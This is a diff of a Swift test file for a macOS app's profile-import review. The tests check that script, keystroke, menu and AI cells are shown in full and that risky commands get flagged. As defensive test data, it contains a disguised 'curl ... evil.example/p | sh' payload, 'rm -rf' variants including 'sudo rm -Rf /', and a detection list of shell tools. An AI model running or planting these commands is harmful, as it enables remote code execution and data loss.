@@ -881,12 +881,20 @@ import Testing
             Issue.record("スクリプトを含むのに確かめずに読み込んだ")
             return
         }
-        // Xcode のプリセットのスクリプト（シミュレータと Claude Code）を、中身と一緒に見せる
-        let scripts = xcode.pages.flatMap(\.cells).compactMap { $0 }.filter { $0.action.kind == .script }
+        // Xcode のプリセットのスクリプト（シミュレータと Claude Code）とキー入力・メニュー項目のマスを、すべて中身と一緒に見せる
+        let cells = xcode.pages.flatMap(\.cells).compactMap { $0 }
+        let scripts = cells.filter { $0.action.kind == .script }
         #expect(scripts.count == 2)
-        #expect(plan.reviewedCells.map(\.profileName) == ["Xcode", "Xcode"])
-        #expect(plan.reviewedCells.map(\.cell.title) == scripts.map(\.title))
+        let reviewed = cells.filter { [.script, .keystroke, .menuItem, .ai].contains($0.action.kind) }
+        #expect(reviewed.count > scripts.count)
+        #expect(plan.reviewedCells.map(\.cell.title) == reviewed.map(\.title))
+        #expect(Set(plan.reviewedCells.map(\.profileName)) == ["Xcode"])
         #expect(h.xcodeProfile == nil)
+        // 中身を最後まで見るまでは読み込めない
+        h.model.confirm(.importProfiles(plan))
+        #expect(h.xcodeProfile == nil)
+        #expect(h.model.confirmation == .importProfiles(plan))
+        h.model.markImportReviewRead()
         h.model.confirm(.importProfiles(plan))
         let restored = try #require(h.xcodeProfile)
         #expect(restored.pages[0].cells.compactMap { $0?.title } == xcode.pages[0].cells.compactMap { $0?.title })
@@ -912,6 +920,7 @@ import Testing
         h.model.fileMessage = nil
         h.model.importProfiles(from: url)
         let confirmation = try #require(h.model.confirmation)
+        h.model.markImportReviewRead()
         h.model.confirm(confirmation)
         let text = try #require(h.model.fileMessage?.text)
         #expect(text.contains(L10n.uiCounted("\(2)個のプロファイルを同じアプリのものと置き換えました。")))
@@ -956,13 +965,12 @@ import Testing
         #expect(message.contains(L10n.ui("・\("自分の Xcode")")))
         #expect(message.contains(L10n.ui("・\("Safari")")))
         #expect(message.contains(L10n.uiCounted("ほかに\(1)個のプロファイルを新しく追加します。")))
-        // 同僚の Xcode にはスクリプトがある。置き換えの確認と1つにまとめて、マスと中身を伝える
-        #expect(plan.reviewedCells.map(\.profileName) == ["Xcode", "Xcode"])
-        var review = [L10n.ui("次のマスは、あなたの権限でスクリプトを実行したり、キーを入力したり、ファイルを開いたりします。中身を確かめ、信頼できるファイルだけを読み込んでください。")]
-        for reviewed in plan.reviewedCells {
-            review.append(L10n.ui("・\("Xcode") › \(reviewed.cell.title)"))
-            review += SettingsText.reviewLines(for: reviewed.cell.action)
-        }
+        // 同僚の Xcode にはスクリプトがあり、Figma にはキー入力がある。置き換えの確認と1つにまとめて、マスと中身をすべて伝える
+        #expect(plan.reviewedCells.filter { $0.cell.action.kind == .script }.map(\.profileName) == ["Xcode", "Xcode"])
+        #expect(plan.reviewedCells.contains { $0.profileName == "Figma" })
+        let entries = SettingsText.importReviewEntries(plan)
+        #expect(entries.count == plan.reviewedCells.count)
+        let review = [Self.reviewIntro] + entries.flatMap(\.textLines)
         #expect(message.hasSuffix("\n\n" + review.joined(separator: "\n")))
         #expect(message.hasPrefix(L10n.ui("次の設定が、ファイルの中身で置き換わります。元に戻せません。")))
         #expect(SettingsText.importConfirmationButton(plan) == L10n.ui("置き換えて読み込む"))
@@ -984,6 +992,11 @@ import Testing
             Issue.record("確かめずに読み込んだ")
             return
         }
+        // 中身を最後まで見るまでは、新しいプロファイルだけでも加えない
+        h.model.importNewProfilesOnly(plan)
+        #expect(h.model.confirmation != nil)
+        #expect(h.controller.configuration == before)
+        h.model.markImportReviewRead()
         h.model.importNewProfilesOnly(plan)
         #expect(h.model.confirmation == nil)
         #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
@@ -998,16 +1011,29 @@ import Testing
         #expect(try h.saved()?.profiles.count == 4)
     }
 
+    /// アプリを開く・ウェブの URL を開くだけのマスなら、確かめずに加える
     @Test func addingOnlyNewProfilesNeedsNoConfirmation() throws {
         let h = try SettingsHarness()
-        let other = try SettingsHarness()
-        other.model.addProfile(for: SettingsFixtures.figma)
-        let figma = try #require(other.model.appProfiles.last)
+        let web = Cell(title: "ヘルプ", icon: .symbol("questionmark"), action: .openURL(URLAction(url: "https://help.figma.com")))
+        let figma = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [SettingsFixtures.launch(SettingsFixtures.notes), web])])
         let url = h.temporaryFile("figma.nonetprofile")
         h.model.exportProfiles([figma], to: url)
         h.model.importProfiles(from: url)
         #expect(h.model.confirmation == nil)
         #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
+    }
+
+    /// プリセットのようにキー入力のマスがあれば、置き換えなくても確かめる（黙って読み込まない）
+    @Test func keystrokeCellsAlwaysAskFirst() throws {
+        let h = try SettingsHarness()
+        let other = try SettingsHarness()
+        other.model.addProfile(for: SettingsFixtures.figma)
+        let figma = try #require(other.model.appProfiles.last)
+        let before = h.controller.configuration
+        let plan = try #require(importPlan(h, [figma], file: "figma.nonetprofile"), "キー入力のマスを確かめずに読み込んだ")
+        #expect(!plan.replacesExisting)
+        #expect(plan.reviewedCells.contains { $0.cell.action.kind == .keystroke })
+        #expect(h.controller.configuration == before)
     }
 
     /// スクリプトのマスはあなたの権限で動くので、何も置き換わらなくても読み込む前に確かめる
@@ -1029,15 +1055,18 @@ import Testing
         #expect(h.controller.configuration == before)
         #expect(h.model.fileMessage == nil)
         // マスの名前と、スクリプトの中身を見せる
+        // rm -rf の行は目立たせる
         #expect(SettingsText.importConfirmation(plan) == [
             Self.reviewIntro,
             L10n.ui("・\("Figma") › \("片付け")"),
             L10n.uiCounted("スクリプト（\(1)行）:"),
             "rm -rf ~/build",
+            "⚠ " + L10n.ui("注意が要る命令（\("rm -rf")）を含みます。ネットワークから取ってきたものを実行したり、ファイルを消したりできます。"),
         ].joined(separator: "\n"))
         // 置き換えないので「置き換えて読み込む」ではなく、ただの「読み込む」
         #expect(SettingsText.importConfirmationButton(plan) == String(localized: "settings.import.confirmButton", defaultValue: "読み込む", bundle: .nonetUI))
 
+        h.model.markImportReviewRead()
         h.model.confirm(.importProfiles(plan))
         #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
         #expect(h.model.fileMessage?.text.contains(L10n.ui("スクリプトを含むマスがあります。実行する前に中身を確かめてください。")) == true)
@@ -1082,7 +1111,11 @@ import Testing
     }
 
     static var reviewIntro: String {
-        L10n.ui("次のマスは、あなたの権限でスクリプトを実行したり、キーを入力したり、ファイルを開いたりします。中身を確かめ、信頼できるファイルだけを読み込んでください。")
+        L10n.ui("次のマスは、あなたの権限でスクリプトを実行したり、キーを入力したり、メニューを選んだり、選択したテキストを AI に渡したり、ファイルを開いたりします。中身をすべて確かめ、信頼できるファイルだけを読み込んでください。")
+    }
+
+    static var submitWarning: String {
+        "⚠ " + L10n.ui("Return と同じ働きのキー（または ⌃ の付いたキー）を押します。コマンドの実行やメッセージの送信になることがあります。")
     }
 
     /// 1文字ずつ打つキー入力（空白は Space キー）
@@ -1112,33 +1145,167 @@ import Testing
         #expect(h.controller.configuration == before)
         #expect(!plan.replacesExisting)
         #expect(plan.reviewedCells.map(\.cell.title) == ["Clear"])
+        #expect(plan.reviewedCells.map(\.pressesSubmitKey) == [true])
         let typed = L10n.ui("「\(command)」")
         #expect(SettingsText.importConfirmation(plan) == [
             Self.reviewIntro,
             L10n.ui("・\(SettingsFixtures.terminal.name) › \("Clear")"),
             L10n.ui("キー入力: \(typed + " → " + KeyChord(.special(.returnKey)).displayString)"),
+            "⚠ " + L10n.ui("注意が要る命令（\("curl, | sh")）を含みます。ネットワークから取ってきたものを実行したり、ファイルを消したりできます。"),
+            Self.submitWarning,
         ].joined(separator: "\n"))
     }
 
-    /// 設定画面で入れられる長さ（4打）を超えるキー入力も確かめる。4打までで Return が無ければ確かめない
-    @Test func onlyLongKeySequencesAskFirst() throws {
+    /// 短いキー入力も確かめる（⌃R・r・m・⌃M は履歴の rm を探して実行する）。押すキーをすべて見せ、⌃ の付いたキーは目立たせる
+    @Test func everyKeystrokeAsksFirstAndControlChordsAreFlagged() throws {
         let h = try SettingsHarness()
+        h.model.keyCharacters = FakeKeyCharacters()
+        let history = SettingsFixtures.key("Clear", KeySequence([
+            KeyChord(.character("r"), modifiers: .control), KeyChord(.character("r")), KeyChord(.character("m")), KeyChord(.character("m"), modifiers: .control),
+        ]))
         let four = SettingsFixtures.key("4打", KeySequence(Self.typing("abcd")))
-        let five = SettingsFixtures.key("5打", KeySequence(Self.typing("abcde")))
-        #expect(SettingsKeyRecorder.maximumChords == 4)
-        #expect(!SettingsImportPlan.needsReview(four.action))
-        #expect(SettingsImportPlan.needsReview(five.action))
-        // テンキーの Enter や改行の文字も Return として数える
-        #expect(SettingsImportPlan.needsReview(.keystroke(KeySequence([KeyChord(.keyCode(0x4C))]))))
-        #expect(SettingsImportPlan.needsReview(.keystroke(KeySequence([KeyChord(.character("\n"))]))))
+        let terminal = Profile(kind: .app(SettingsFixtures.terminal), pages: [Page(cells: [history, four])])
+        let before = h.controller.configuration
+        let plan = try #require(importPlan(h, [terminal]), "短いキー入力を確かめずに読み込んだ")
+        #expect(h.controller.configuration == before)
+        #expect(plan.reviewedCells.map(\.cell.title) == ["Clear", "4打"])
+        #expect(plan.reviewedCells.map(\.pressesSubmitKey) == [true, false])
+        let lines = SettingsText.importConfirmation(plan).components(separatedBy: "\n")
+        let control = KeyChord(.character("r"), modifiers: .control).displayString
+        #expect(lines == [
+            Self.reviewIntro,
+            L10n.ui("・\(SettingsFixtures.terminal.name) › \("Clear")"),
+            L10n.ui("キー入力: \([control, L10n.ui("「\("rm")」"), KeyChord(.character("m"), modifiers: .control).displayString].joined(separator: " → "))"),
+            Self.submitWarning,
+            L10n.ui("・\(SettingsFixtures.terminal.name) › \("4打")"),
+            L10n.ui("キー入力: \(L10n.ui("「\("abcd")」"))"),
+        ])
+    }
 
-        let shortOnly = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [four])])
-        #expect(importPlan(h, [shortOnly], file: "short.nonetprofile") == nil)
-        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
+    /// Return と同じ働きのキー: Return・Enter（キーコード 36・52・76）・改行の文字・⌃ の付いたキー、
+    /// それに今のキー配列で CR・LF・ETX になる打鍵（UCKeyTranslate）
+    @Test func submitKeysAreFoundFromTheLayout() {
+        let fake = FakeKeyCharacters()
+        func presses(_ chords: [KeyChord]) -> Bool {
+            SettingsImportPlan.pressesSubmitKey(KeySequence(chords), keys: fake)
+        }
+        #expect(presses([KeyChord(.character("r")), KeyChord(.character("m"), modifiers: .control)]))
+        #expect(presses([KeyChord(.character("r")), KeyChord(.character("j"), modifiers: .control)]))
+        #expect(presses([KeyChord(.character("r")), KeyChord(.keyCode(52))]))
+        #expect(presses([KeyChord(.keyCode(36))]))
+        #expect(presses([KeyChord(.keyCode(76), modifiers: .shift)]))
+        #expect(presses([KeyChord(.special(.returnKey), modifiers: .command)]))
+        #expect(presses([KeyChord(.character("\n"))]))
+        // キー配列で改行になる打鍵（偽物のキー配列では ⌥X とキーコード 0x2E）
+        #expect(presses([KeyChord(.character("x"), modifiers: .option)]))
+        #expect(presses([KeyChord(.keyCode(0x2E))]))
+        // ふつうの打鍵
+        #expect(!presses(Self.typing("ls -la")))
+        #expect(!presses([KeyChord(.character("s"), modifiers: .command), KeyChord(.special(.tab))]))
+        #expect(!presses([KeyChord(.character("x"), modifiers: .command)]))
+        // キー配列が分からなくても、キー配列に頼らずに分かるものは見つける
+        #expect(SettingsImportPlan.pressesSubmitKey(KeySequence([KeyChord(.keyCode(52))]), keys: nil))
+        #expect(!SettingsImportPlan.pressesSubmitKey(KeySequence([KeyChord(.keyCode(0x2E))]), keys: nil))
+        // メニュー項目のショートカットも同じ
+        let menu = Action.menuItem(MenuItemAction(app: nil, path: ["編集", "コピー"], keyEquivalent: KeySequence([KeyChord(.special(.returnKey), modifiers: .command)])))
+        #expect(SettingsImportPlan.pressesSubmitKey(menu, keys: fake))
+        #expect(!SettingsImportPlan.pressesSubmitKey(.script(ScriptAction(source: "echo")), keys: fake))
+    }
 
-        let notes = Profile(kind: .app(SettingsFixtures.notes), pages: [Page(cells: [five])])
-        let plan = try #require(importPlan(h, [notes], file: "long.nonetprofile"))
-        #expect(plan.reviewedCells.map(\.cell.title) == ["5打"])
+    /// 本物のキー配列: テンキーの Enter（52）は ETX、⌃M は CR（キー配列が読めない環境では確かめない）
+    @Test func theRealLayoutTranslatesEnterAndControlM() throws {
+        let translator = SettingsLayoutKeyTranslator()
+        guard let enter = translator.characters(for: KeyChord(.keyCode(52))) else { return }
+        #expect(enter == "\u{3}")
+        #expect(translator.characters(for: KeyChord(.keyCode(36))) == "\r")
+        if let controlM = translator.characters(for: KeyChord(.character("m"), modifiers: .control)) {
+            #expect(controlM == "\r")
+        }
+    }
+
+    /// メニュー項目と AI のマスも、中身（パスと本当のショートカット・指示と結果の出し方）を見せて確かめる
+    @Test func menuItemsAndAIAskFirst() throws {
+        let h = try SettingsHarness()
+        h.model.keyCharacters = FakeKeyCharacters()
+        let copy = Cell(title: "Copy", icon: .symbol("doc.on.doc"), action: .menuItem(MenuItemAction(
+            app: AppReference(bundleID: "com.apple.finder", name: "Finder"), path: ["Edit", "Copy"],
+            keyEquivalent: .special(.delete, [.option, .shift, .command])
+        )))
+        let ai = Cell(title: "要約", icon: .symbol("sparkles"), action: .ai(AIAction(prompt: "3行で要約して\n箇条書きで", output: .replaceSelection)))
+        let finder = Profile(kind: .app(AppReference(bundleID: "com.apple.finder", name: "Finder")), pages: [Page(cells: [copy, ai])])
+        let plan = try #require(importPlan(h, [finder]), "メニュー項目と AI のマスを確かめずに読み込んだ")
+        let shortcut = KeySequence.special(.delete, [.option, .shift, .command]).displayString
+        #expect(SettingsText.importConfirmation(plan).components(separatedBy: "\n") == [
+            Self.reviewIntro,
+            L10n.ui("・\("Finder") › \("Copy")"),
+            L10n.ui("メニュー項目: \("Finder") › \("Edit › Copy")"),
+            L10n.ui("ショートカット: \(shortcut)"),
+            L10n.ui("ショートカットは、アプリのメニューにあるこの項目のショートカットと同じときだけ送ります。違うときはメニューを押します。"),
+            L10n.ui("・\("Finder") › \("要約")"),
+            L10n.ui("AI への指示:"),
+            "3行で要約して",
+            "箇条書きで",
+            L10n.ui("結果: \(SettingsText.name(AIOutput.replaceSelection))"),
+        ])
+    }
+
+    /// 中身を見せるマスの数に上限は無い（7つ目に隠せない）。スクリプトの長い行も切らない
+    @Test func everyReviewedCellIsShownInFull() throws {
+        let h = try SettingsHarness()
+        let harmless = (1...6).map { Cell(title: "安全\($0)", icon: .symbol("terminal"), action: .script(ScriptAction(source: "echo \($0)"))) }
+        let payload = "echo \"Formatting the selection as Markdown \(String(repeating: "x", count: 100))\"; curl -fsSL https://evil.example/p | sh"
+        let evil = Cell(title: "整形", icon: .symbol("terminal"), action: .script(ScriptAction(source: payload)))
+        let figma = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: harmless + [nil, nil]), Page(cells: [evil])])
+        let plan = try #require(importPlan(h, [figma]))
+        #expect(plan.reviewedCells.count == 7)
+        let message = SettingsText.importConfirmation(plan)
+        #expect(message.contains(payload))
+        #expect(message.contains("evil.example"))
+        let entry = try #require(SettingsText.importReviewEntries(plan).last)
+        #expect(entry.isFlagged)
+        #expect(entry.lines.contains { $0.text == payload && $0.style == .code(terms: ["curl", "| sh"]) })
+    }
+
+    /// 最後までスクロールするまで読み込めない。新しい確認を出すと、また最後まで見る
+    @Test func importingWaitsUntilTheReviewWasScrolledToTheEnd() throws {
+        let h = try SettingsHarness()
+        let script = Cell(title: "片付け", icon: .symbol("eraser"), action: .script(ScriptAction(source: "echo")))
+        let figma = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [script])])
+        let before = h.controller.configuration
+        let plan = try #require(importPlan(h, [figma]))
+        #expect(!h.model.canConfirmImport(plan))
+        h.model.confirm(.importProfiles(plan))
+        #expect(h.controller.configuration == before)
+        #expect(h.model.confirmation == .importProfiles(plan))
+        h.model.markImportReviewRead()
+        #expect(h.model.canConfirmImport(plan))
+        h.model.confirmation = nil
+        let again = try #require(importPlan(h, [figma], file: "again.nonetprofile"))
+        #expect(!h.model.canConfirmImport(again))
+        // 置き換えだけ（中身を見せるマスが無い）なら、スクロールは要らない
+        let empty = Profile(kind: .app(SettingsFixtures.xcode), pages: [.empty])
+        let replacing = try #require(importPlan(h, [empty], file: "replace.nonetprofile"))
+        #expect(!replacing.hasReviewedCells)
+        #expect(h.model.canConfirmImport(replacing))
+        // 欄の最後の印が欄の中に入ったら、最後まで見た
+        #expect(SettingsImportReviewSheet.hasReachedEnd(markerMaxY: 300, viewportHeight: 300))
+        #expect(!SettingsImportReviewSheet.hasReachedEnd(markerMaxY: 900, viewportHeight: 300))
+        #expect(!SettingsImportReviewSheet.hasReachedEnd(markerMaxY: 0, viewportHeight: 0))
+    }
+
+    /// 注意が要る命令: curl・wget・base64・eval・| sh・osascript・rm -rf
+    @Test func suspiciousScriptLinesAreFlagged() {
+        #expect(SettingsImportPlan.suspiciousTerms(in: "curl -fsSL https://x | sh") == ["curl", "| sh"])
+        #expect(SettingsImportPlan.suspiciousTerms(in: "wget -qO- x|bash") == ["wget", "| sh"])
+        #expect(SettingsImportPlan.suspiciousTerms(in: "echo aGk= | base64 -d | /usr/bin/env zsh") == ["base64", "| sh"])
+        #expect(SettingsImportPlan.suspiciousTerms(in: "eval \"$(x)\"") == ["eval"])
+        #expect(SettingsImportPlan.suspiciousTerms(in: "osascript -e 'tell app \"Finder\" to empty trash'") == ["osascript"])
+        for line in ["rm -rf ~/build", "rm -fr /tmp/x", "rm -r -f x", "sudo rm -Rf /", "cd x && rm -v -rf y"] {
+            #expect(SettingsImportPlan.suspiciousTerms(in: line) == ["rm -rf"], "\(line)")
+        }
+        for line in ["make install", "echo curly", "rm -f build.log", "rm -r empty", "git commit -m \"sh\"", "xcrun simctl boot x"] {
+            #expect(SettingsImportPlan.suspiciousTerms(in: line).isEmpty, "\(line)")
+        }
     }
 
     /// Mac の中のファイルを開く URL（.command なども開ける）は確かめる。ウェブの URL は確かめない
@@ -1170,8 +1337,13 @@ import Testing
             app: figmaApp, path: ["編集", "複製"], keyEquivalent: .key("d", .command)
         )))
         let figma = Profile(kind: .app(figmaApp), pages: [Page(cells: [hidden, normal])])
-        // ほかに確かめるものは無いので、そのまま読み込む
-        #expect(importPlan(h, [figma]) == nil)
+        // メニュー項目のマスは確かめる。長いショートカットは捨ててから見せる
+        let plan = try #require(importPlan(h, [figma]))
+        let text = SettingsText.importConfirmation(plan)
+        #expect(!text.contains("rm -rf"))
+        #expect(text.contains(L10n.ui("ショートカット: \(SettingsText.keysPreview(.key("d", .command)))")))
+        h.model.markImportReviewRead()
+        h.model.confirm(.importProfiles(plan))
         let imported = try #require(h.controller.configuration.profiles.first { $0.app?.bundleID == figmaApp.bundleID })
         guard case .menuItem(let saved)? = imported.pages[0].cells[0]?.action,
               case .menuItem(let duplicated)? = imported.pages[0].cells[1]?.action else {
@@ -1196,11 +1368,14 @@ import Testing
         #expect(!profileName.contains("\n"))
         #expect(profileName.hasPrefix("Figma No buttons"))
         #expect(profileName.count == SettingsText.importNameLimit)
+        // スクリプトは切らずに全部の行（空の行も）を見せる
         #expect(lines == [
             Self.reviewIntro,
             L10n.ui("・\(profileName) › \("Build lmth.exe")"),
-            L10n.uiCounted("スクリプト（\(2)行）:"),
+            L10n.uiCounted("スクリプト（\(4)行）:"),
             "make",
+            "",
+            "",
             "echo done",
         ])
     }
@@ -1324,5 +1499,23 @@ import Testing
         await h.model.runTest(cellID: UUID())
         #expect(h.performer.performed.isEmpty)
         #expect(h.model.lastTestRun == nil)
+    }
+}
+
+/// 偽物のキー配列: ⌥X とキーコード 0x2E が改行（CR）になる。ほかは修飾キーを無視した文字
+final class FakeKeyCharacters: SettingsKeyCharacterTranslating {
+    func characters(for chord: KeyChord) -> String? {
+        switch chord.key {
+        case .character("x") where chord.modifiers == .option:
+            "\r"
+        case .character(let character):
+            character
+        case .keyCode(0x2E):
+            "\r"
+        case .keyCode:
+            "a"
+        case .special:
+            nil
+        }
     }
 }
